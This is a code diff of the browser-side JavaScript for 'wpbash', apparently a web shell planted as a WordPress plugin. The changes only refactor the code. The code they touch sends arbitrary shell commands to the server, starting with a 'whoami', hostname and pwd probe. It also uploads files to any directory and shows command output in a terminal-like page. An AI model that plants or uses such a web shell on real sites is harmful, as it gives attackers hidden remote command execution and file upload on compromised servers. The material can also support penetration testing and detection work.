@@ -9,28 +9,23 @@
     var defaultDir = "";
     var commandHistory = [];
     var currentCommand = 0;
+    var formElement = document.getElementById("wpbash_form");
+    var inputTextElement = document.getElementById('wpbash_inputtext');
+    var inputElement = document.getElementById("wpbash_input");
+    var outputElement = document.getElementById("wpbash_output");
+    var usernameElement = document.getElementById("wpbash_username");
+    var uploadFormElement = document.getElementById("wpbash_upload");
+    var fileBrowserElement = document.getElementById("wpbash_filebrowser");
 
-    window.onload = (event) => {
-        
-        var formElement = document.getElementById("wpbash_form");
-        var inputTextElement = document.getElementById('wpbash_inputtext');
-        var inputElement = document.getElementById("wpbash_input");
-        var outputElement = document.getElementById("wpbash_output");
-        var usernameElement = document.getElementById("wpbash_username");
-        var uploadFormElement = document.getElementById("wpbash_upload");
-        var fileBrowserElement = document.getElementById("wpbash_filebrowser");
-
-        getShellInfo();
-        
-        document.onkeydown = checkForArrowKeys;
-        
-        formElement.addEventListener("submit", function(event){
-            event.preventDefault()
-        });
-
-    }
-        
-    window.getShellInfo = () => {
+    window.onload = (event) => getShellInfo();
+    
+    document.onkeydown = checkForArrowKeys;
+    
+    formElement.addEventListener("submit", function(event){
+        event.preventDefault()
+    });
+    
+    window.getShellInfo = function() {
         var request = new XMLHttpRequest();
         
         request.onreadystatechange = function() {
@@ -50,7 +45,7 @@
         request.send("cmd=whoami&hostname&pwd&action=wpbash");
     }
                 
-    window.sendCommand = () => {
+    window.sendCommand = function() {
         var request = new XMLHttpRequest();
         var command = inputTextElement.value;
         var originalCommand = command;
@@ -105,7 +100,7 @@
         return false;
     }
     
-    window.uploadFile = () => {
+    window.uploadFile = function() {
         var formData = new FormData();
         formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
         formData.append('path', currentDir);
@@ -123,11 +118,11 @@
         outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
     }
     
-    window.updateInputWidth = () => {
+    window.updateInputWidth = function() {
         inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
     }
 
-    window.checkForArrowKeys = (e) => {
+    window.checkForArrowKeys = function(e) {
         e = e || window.event;
 
         if (e.keyCode == '38') {
@@ -137,19 +132,19 @@
         }
     }
     
-    window.previousCommand = () => {
+    window.previousCommand = function() {
         if (currentCommand != 0) {
             switchCommand(currentCommand-1);
         }
     }
     
-    window.nextCommand = () => {
+    window.nextCommand = function() {
         if (currentCommand != commandHistory.length) {
             switchCommand(currentCommand+1);
         }
     }
     
-    window.switchCommand = (newCommand) => {
+    window.switchCommand = function(newCommand) {
         currentCommand = newCommand;
 
         if (currentCommand == commandHistory.length) {
